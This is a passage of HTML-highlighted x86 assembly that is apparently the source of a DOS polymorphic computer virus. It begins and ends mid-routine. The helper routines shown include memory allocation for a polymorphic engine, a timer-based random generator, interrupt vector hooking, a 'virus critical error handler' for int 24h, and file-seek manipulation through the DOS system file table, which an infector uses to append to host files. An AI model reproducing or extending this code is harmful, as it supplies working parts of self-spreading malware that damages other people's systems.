                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Restore allocation strategy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Check segment</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_seg</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_mem_error</span><span class="sc0">

                </span><span class="sc1">;Restore regs        </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">exit_mem_error</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Restore regs        </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Free previous allocated memory                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">free_memory</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc5">free_try_again</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_seg</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">free_try_again</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Get random number from our rnd buffer                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">get_rnd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">rnd_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">into_random_data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">into_random_data</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">rnd_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Timer based random number generator                                       ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">random_number</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">randomize</span><span class="sc4">:</span><span class="sc0">       
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">randomize</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a 16bit random number                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">rand_16</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a random number betwin 0 and ax                                  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">rand_in_range</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Returns a random num between 0 and entry ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Remainder in dx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">  
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Return the al vector in es:bx                                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">get_int</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Set al interrupt vector to ds:dx pointer                                  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">set_int</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Get sft address in es:di                                                  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">get_sft</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;File handle in bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Get job file table entry to es:di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">error_sft</span><span class="sc0">

                </span><span class="sc1">;Exit if handle not opened</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">error_sft</span><span class="sc0">

                </span><span class="sc1">;Get address of sft entry number bx to es:di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">error_sft</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
        
</span><span class="sc5">error_sft</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Exit with error</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Seek to end of file                                                       ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">seek_end</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Seek to begin                                                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">seek_begin</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus critical error interrupt handler ( int 24h )                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">my_int24h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc1">;Return error in function</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Save all registers in the stack                                           ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">push_all</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_off</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_off</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Restore all registers from the stack                                      ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">pop_all</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_off</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
